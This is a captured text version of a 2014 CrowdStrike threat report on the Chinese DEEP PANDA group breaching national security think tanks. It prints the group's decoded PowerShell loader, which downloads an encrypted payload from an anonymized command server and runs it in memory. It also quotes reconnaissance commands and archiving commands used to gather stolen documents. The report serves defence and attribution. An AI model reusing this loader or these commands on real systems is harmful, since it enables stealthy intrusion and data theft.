@@ -1,0 +1,617 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+2016/5/2 Deep in Thought: Chinese Targeting of National Security Think Tanks »
+
+http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/ 1/9
+
+July 7, 2014 Dmitri Alperovitch Executive Viewpoint
+
+Deep in Thought: Chinese
+
+Targeting of National Security
+
+Think Tanks
+
+For some time now, CrowdStrike has been working with a
+
+number of national security think tanks and human rights
+
+organizations on a pro bono basis to help them with their
+
+security posture. These organizations face some of the most
+
+advanced nation-state adversaries — China, Russia, and Iran,
+
+just to name a few. The individuals who are typically targeted at
+
+these institutions tend to be former senior government officials
+
+who still have lots of contacts within Western governments and,
+
+as such, their private correspondence is of extreme interest to
+
+these attackers. The intelligence services of these nation states
+
+are always on the lookout for any clues they may extract from
+
+such private communications that may give them an advanced
+
+insight into what options government policy makers are
+
+considering on particular issues of interest. At the same time,
+
+with access to the victim email mailboxes, the adversaries can
+
+http://www.crowdstrike.com/blog/author/dmitri/
+http://www.crowdstrike.com/blog/category/executive-viewpoint/
+
+
+2016/5/2 Deep in Thought: Chinese Targeting of National Security Think Tanks »
+
+http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/ 2/9
+
+craft very realistic spear-phishing lures to the government
+
+contacts of targeted think tank personnel by piggybacking on
+
+ongoing real conversations and increasing their chances of a
+
+successful compromise of an official government email account.
+
+Despite this high threat level, these think tanks are organized as
+
+non-profits and often do not have the budgets of commercial
+
+organizations to afford cutting-edge security technologies that
+
+can help them effectively detect these threats. For this reason,
+
+CrowdStrike has provided our Falcon Host endpoint security
+
+technology to many of these organizations at no charge to them
+
+to help detect and attribute these attackers on their networks in
+
+real time, as well as to receive instantaneous full forensic
+
+visibility into their behavior to help with full remediation of any
+
+incident.
+
+Recently, Falcon Host has detected multiple simultaneous
+
+compromises at several national security think tanks from an
+
+actor we call DEEP PANDA, one of the most advanced Chinese
+
+nation-state cyber intrusion groups. For almost three years now,
+
+CrowdStrike has monitored DEEP PANDA targeting critical and
+
+strategic business verticals including: government, defense,
+
+financial, legal, and the telecommunications industries. At the
+
+think tanks, Falcon Host detected targeting of senior individuals
+
+involved in geopolitical policy issues, in particular in the
+
+China/Asia Pacific region. However, last week the unprecedented
+
+real-time visibility provided by Falcon Host into this actor’s
+
+escapades allowed analysts to observe a radical change in
+
+targeting.
+
+This actor, who was engaged in targeting and collection of
+
+Southeast Asia policy information, suddenly began targeting
+
+individuals with a tie to Iraq/Middle East issues. This is
+
+undoubtedly related to the recent Islamic State of Iraq and the
+
+Levant (ISIS) takeover of major parts of Iraq and the potential
+
+disruption for major Chinese oil interests in that country. In fact,
+
+Iraq happens to be the fifth-largest source of crude oil imports
+
+for China and the country is the largest foreign investor in Iraq’s
+
+oil sector. Thus, it wouldn’t be surprising if the Chinese
+
+government is highly interested in getting a better sense of the
+
+possibility of deeper U.S. military involvement that could help
+
+protect the Chinese oil infrastructure in Iraq. In fact, the shift in
+
+targeting of Iraq policy individuals occurred on June 18, the day
+
+http://www.crowdstrike.com/falcon-host/index.html
+
+
+2016/5/2 Deep in Thought: Chinese Targeting of National Security Think Tanks »
+
+http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/ 3/9
+
+that ISIS began its attack on the Baiji oil refinery.
+
+The Attacks
+CrowdStrike’s Falcon Host technology used by these think tanks
+
+consists of a tiny (under 5mb in size) kernel sensor that is
+
+deployed on Windows and Mac servers, desktops, and laptops
+
+and is able to do real-time detection and recording of all
+
+adversary activities taking place on the system. In addition, by
+
+matching the detected activities against our vast Adversary
+
+Intelligence repository, Falcon Host can automatically attribute
+
+the attack to a known adversary group and provide details about
+
+their motivations, capabilities, and key Tactics, Techniques, and
+
+Procedures (TTPs).
+
+Recently, we detected breaches of these networks via the use of
+
+powershell scripts deployed by the adversary as scheduled tasks
+
+on Windows machines. The scripts are passed to the powershell
+
+interpreter through the command line to avoid placement of
+
+extraneous files on the victim machine that could potentially
+
+trigger AV- or Indicator of Compromise (IOC)-based detection.
+
+The scripts were scheduled to call back every two hours to the
+
+DEEP PANDA Command and Control (C2) infrastructure.
+
+The script in the command line is base64 encoded, but when
+
+decoded it translates to the following code snippet:
+
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback
+
+http://www.crowdstrike.com/falcon-intelligence/index.html
+https://lh3.googleusercontent.com/SF-RYx43NTfbm-Wp_LusKvsf9CDDuB-dythktCqyJrXePKizhMYDk7jmi3wRVBJZMcomznoEyjDFux-1A4g4K5j2kLkYvj3MaGR70INvES0_KDfIQedj8jrusTw2yhpHkQ
+https://lh6.googleusercontent.com/yo-K0bH-pytx_StQPc8hOO9Zqv5qZ9-K6XzGmt0Xv3n3EVi5rkBS5D2iQn6bfcCffz1f4LnqBUJ8E_CM1DYvLKTR7tQASwQSthBxoqRgJRnkS8NRgxf9f1a-5WWWZEsetg
+
+
+2016/5/2 Deep in Thought: Chinese Targeting of National Security Think Tanks »
+
+http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/ 4/9
+
+ = {$true}
+$wc = New­Object ­TypeName System.Net.WebClient
+
+$wc.Headers.Add(“Accept­Language”, “en­
+US,en;q=0.” + ([IntPtr]::Size – 1).ToString())
+$wc.Headers.Add(“User­Agent”, “Mozilla/5.0 
+(compatible; MSIE 10.0; Windows NT 6.1; WOW64; 
+Trident/6.0)”)
+$rndn = Get­Random
+$wc.Headers.Add(“Cookie”, “p=” + $rndn)
+$data = 
+$wc.DownloadData(“https://<ANONYMIZED>/config/oauth/”)
+[string[]]$xags = 
+“https://<ANONYMIZED>/config/login/”, 
+“WMITool.Program”, “Main”, “/f”, “ssh”, “/s”, 
+“<ANONYMIZED>”, “/p”, “443”
+$Passphrase = “<ANONYMIZED>”
+$salts = “<ANONYMIZED>”
+$r = new­Object 
+System.Security.Cryptography.RijndaelManaged
+$pass = 
+[System.Text.Encoding]::UTF8.GetBytes($Passphrase)
+$salt = 
+[System.Text.Encoding]::UTF8.GetBytes($salts)
+$r.Key = (new­Object 
+Security.Cryptography.PasswordDeriveBytes $pass, 
+$salt, “SHA1”, 5).GetBytes(32) #256/8
+$r.IV = (new­Object 
+Security.Cryptography.SHA1Managed).ComputeHash( 
+[Text.Encoding]::UTF8.GetBytes($rndn) )[0..15]
+$d = $r.CreateDecryptor()
+$ms = new­Object IO.MemoryStream @(,$data)
+$cs = new­Object 
+Security.Cryptography.CryptoStream $ms,$d,”Read”
+$dfs = New­Object 
+System.IO.Compression.GzipStream $cs, 
+([IO.Compression.CompressionMode]::Decompress)
+$msout = New­Object System.IO.MemoryStream
+[byte[]]$buffer = new­object byte[] 4096
+[int]$count = 0
+do
+{
+ $count = $dfs.Read($buffer, 0, $buffer.Length)
+ $msout.Write($buffer, 0, $count) 
+} while ($count ­gt 0)
+$dfs.Close()
+$cs.Close()
+$ms.Close()
+$r.Clear()
+[byte[]]$bin = $msout.ToArray()
+$al = New­Object ­TypeName 
+System.Collections.ArrayList
+$al.Add($xags)
+$asm = [System.Reflection.Assembly]::Load($bin)
+$asm.EntryPoint.Invoke($null, $al.ToArray())
+sleep 5
+Exit
+Once executed, it downloads and executes from memory a .NET
+
+executable (typically named Wafer), which in turn typically
+
+
+
+2016/5/2 Deep in Thought: Chinese Targeting of National Security Think Tanks »
+
+http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/ 5/9
+
+downloads and runs MadHatter .NET Remote Access Tool (RAT),
+
+one of the favorites of DEEP PANDA. By running them from
+
+memory, it leaves no disk artifacts or host-based IOCs that can
+
+be identified in forensic analysis. This is typical for DEEP PANDA
+
+— stealth is their specialty and they prefer to operate in a way
+
+that leaves a minimal footprint on a victim system and often
+
+allows them to evade detection for a very long time.
+
+For this same reason, DEEP PANDA likes to use webshells to keep
+
+low-footprint persistent access to the victim network, as we’ve
+
+covered in our prior blogs. This case was no exception, and that
+
+initial webshell implant allowed them to execute reconnaissance
+
+commands such as “tasklist,” “net view,” and “net
+localgroup administrators,” and then afterward to deploy the
+powershell scripts.
+
+The adversary used stolen credentials to mount network shares
+
+via “net use” command. In one case, they brought in Cult of
+the Dead Cow’s NetE tool onto the system, but most of the time
+
+they leveraged existing Windows tools and avoided bringing
+
+many new tools into the environment that could make them
+
+noisy and easily detectable by technologies that scan for static
+
+IOCs.
+
+After using compromised credentials to mount file shares, the
+
+adversary was seen compressing data using 7-zip. They were
+
+adding different document types to compressed files by
+
+wildcarding the extensions, such as:
+
+“C:Program Files7­Zip7z” a setup1.log ­r ­pkkk*** 
+“\<share name>users<UserName>*rtf *doc”
+“C:Program Files7­Zip7z” a setup1.log ­r ­pkkk*** 
+
+“\<share name>users<UserName>*ppt”
+
+They knew exactly which users to target based on their research
+
+policy area, and they rapidly pivoted from China/Asia Pacific
+
+policy experts to Iraq/Middle East policy experts once their
+
+tasking collection requirements changed.
+
+https://lh5.googleusercontent.com/N1crCEP0ZZnvHQkGZmZ8E1nPMa2ANAuXM_H9iJbBPo7BoCkxb4z_8oLD3DNqmxTk7jPmfdrlO1IGTEwPFZQVJxJaxuz8lngiogeWFmwP6fEHzgC1J9JcaPo5LqO3K0ARPw
+http://www.crowdstrike.com/blog/mo-shells-mo-problems-deep-panda-web-shells/
+http://www.cultdeadcow.com/tools/nete.html
+
+
+2016/5/2 Deep in Thought: Chinese Targeting of National Security Think Tanks »
+
+http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/ 6/9
+
+Aggressive Use of Ping to Determine Which Machines of Interest
+
+are Online
+
+On one of the compromised machines, the adversary brought in
+
+a command-line version of RAR archiver that was named
+
+“cftmon.exe” and placed it into “c:windowstemphotfix”
+directory. The files were encrypted (both file data and headers)
+
+with “uinfw” password and the archive files were named after
+the initials of each user that had been targeted and stored in the
+
+same “c:windowstemphotfix” directory.
+
+For lateral movement, they used WMI to deploy the powershell
+
+scripts remotely and setup scheduled tasks on the remote
+
+systems.
+
+Despite the fact that we were seeing nearly identical TTPs used
+
+across multiple think-tank targets, there is evidence to indicate
+
+ BLOG
+
+https://lh6.googleusercontent.com/GlwX_bhV1_2QNAbuLUSzJMS60KroMW3yxcGXIlLmO-oOtloMmbXwPiVVxFAqloYA5rB30kZWhoZtQK1SLLTzQOEXPQi2M9rb1EcoshPPGkT2y83Oz435DBWs6PK1jMRLIw
+https://lh3.googleusercontent.com/c7jH8zP6URF92oQCYysJNWa3EV-uqRHKAak-uwxLVZa7aycQpVa_lFkc_xhRQppHA_ECy9j4-33JVTJUY-bDplils8C9vyzyezOQX72gmOQ2cMgelE_W47OVLlZITdr43Q
+http://www.crowdstrike.com/
+http://www.crowdstrike.com/blog/
+
+
+2016/5/2 Deep in Thought: Chinese Targeting of National Security Think Tanks »
+
+http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/ 7/9
+
+  Tweet   Share
+
+that these operations had different individuals behind the
+
+keyboard based on the intricacies of how certain powershell
+
+command lines had been used in each case.
+
+Summary
+DEEP PANDA presents a very serious threat not just to think
+
+tanks, but also multinational financial institutions, law firms,
+
+defense contractors, and government agencies. Due to their
+
+stellar operational security and reliance on anti-forensic and
+
+anti-IOC detection techniques, detecting and stopping them is
+
+very challenging without the use of next-generation endpoint
+
+technology like Falcon Host.  Not only was Falcon Host able to
+
+detect this adversary without relying on static signatures or
+
+IOCs, but it was able to provide instantaneous and full forensic
+
+analysis of what had occurred on each of the compromised
+
+endpoints without the need to pull hard drives and do costly and
+
+time-intensive forensics, substantially reducing the time needed
+
+for remediation.
+
+If you are a non-profit think tank or a human rights organization
+
+that would like to take advantage of our no-charge offer of Falcon
+
+Host licenses for your servers and desktops, please email us at
+
+sales@crowdstrike.com with the subject “Non-Profit Falcon
+Host Offer.”  
+
+Our Falcon Intelligence subscribers have had access to multiple
+
+reports on the DEEP PANDA actor that includes full analysis of
+
+their attribution, tradecraft and TTPs, as well as detection
+
+indicators and signatures and remediation instructions. And our
+
+CrowdStrike Services has worked on multiple intrusion
+
+investigations related to DEEP PANDA in the last year. If you
+
+would also like to see a demo of Falcon Host or Falcon
+
+Intelligence in action or discuss our Services offerings, please
+
+contact our Sales Team to schedule a personal briefing.
+
+Stay safe and keep a watchful eye on the Pandas, Bears, Kittens,
+
+and other adversaries who are relentlessly preying on your data!
+
+ 
+
+
+
+http://twitter.com/share?text=Deep%20in%20Thought%3A%20Chinese%20Targeting%20of%20National%20Security%20Think%20Tanks&url=http%3A%2F%2Fwww.crowdstrike.com%2Fblog%2Fdeep-thought-chinese-targeting-national-security-think-tanks%2F
+http://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Fwww.crowdstrike.com%2Fblog%2Fdeep-thought-chinese-targeting-national-security-think-tanks%2F&title=Deep%20in%20Thought%3A%20Chinese%20Targeting%20of%20National%20Security%20Think%20Tanks&summary=%3Cp%3EFor%20some%20time%20now%2C%20CrowdStrike%20has%20been%20working%20with%20a%20number%20of%20national%20security%20think%20tanks%20and%20human%20rights%20organizations%20on%20a%20pro%20bono%20basis%20to%20help%20them%20with%20their%20security%20posture.%20These%20organizations%20face%20some%20of%20the%20most%20advanced%26hellip%3B%3C%2Fp%3E&source=http://www.crowdstrike.com/blog/
+mailto:sales@crowdstrike.com
+http://services.crowdstrike.com/
+mailto:sales@crowdstrike.com
+
+
+2016/5/2 Deep in Thought: Chinese Targeting of National Security Think Tanks »
+
+http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/ 8/9
+
+U.S. – China
+Agreement on
+Cyber
+Intrusions: An
+Inflection
+Point
+
+Chinese
+
+economic
+
+espionage
+
+reached its
+
+boiling point
+
+some time ago,
+
+and has been
+
+scalding
+
+industries
+
+throughout…
+
+Are You More
+Interested in
+Stopping a
+Breach or
+Stopping
+Malware?
+
+This is a
+
+question I ask a
+
+lot of
+
+organizations
+
+that I speak with.
+
+While the…
+
+VENOM
+Vulnerability:
+Community
+Patching and
+Mitigation
+Update
+
+Today,
+
+CrowdStrike
+
+disclosed a
+
+critical virtual
+
+machine escape
+
+vulnerability
+
+(which we named
+
+VENOM)
+
+discovered by
+
+our…
+
+Dmitri Alperovitch
+
+Co-founder and CTO of Crowdstrike, Dmitri Alperovitch
+
+leads the Intelligence, Technology and CrowdStrike Labs
+
+teams. Alperovitch has invented 18 patented
+
+technologies and has conducted extensive research on
+
+reputation systems, spam detection, web security,
+
+public-key and identity-based cryptography, malware
+
+and intrusion detection/prevention. He is a renowned
+
+computer security researcher and thought leader on
+
+cybersecurity policies and state tradecraft.
+
+Alperovitch’s many honors include being selected as
+
+MIT Technology Review’s “Young Innovators under
+35” (TR35) in 2013. He also was named Foreign Policy
+Magazine’s Leading Global Thinker for 2013 and
+
+received a Federal 100 Award for his information
+
+security contributions.
+
+Related Content
+
+http://www.crowdstrike.com/blog/cyber-agreement/
+http://www.crowdstrike.com/blog/are-you-more-interested-in-stopping-a-breach-or-stopping-malware/
+http://www.crowdstrike.com/blog/venom-vulnerability-community-patching-and-mitigation-update/
+http://www.crowdstrike.com/blog/staff-member/dmitri-alperovitch/
+http://www.crowdstrike.com/blog/cyber-agreement/
+http://www.crowdstrike.com/blog/are-you-more-interested-in-stopping-a-breach-or-stopping-malware/
+http://www.crowdstrike.com/blog/venom-vulnerability-community-patching-and-mitigation-update/
+
+
+2016/5/2 Deep in Thought: Chinese Targeting of National Security Think Tanks »
+
+http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/ 9/9
+
+       
+
+Copyright © 2016 CrowdStrike |  Privacy |  Request Info |  Blog |  Contact Us |  1.888.512.8906
+
+https://twitter.com/CrowdStrike
+https://www.linkedin.com/company/crowdstrike
+https://www.facebook.com/CrowdStrike/
+http://www.youtube.com/user/CrowdStrike
+http://www.crowdstrike.com/privacy-notice/
+http://www.crowdstrike.com/request-information/
+http://www.crowdstrike.com/blog
+http://www.crowdstrike.com/contact-us/
+
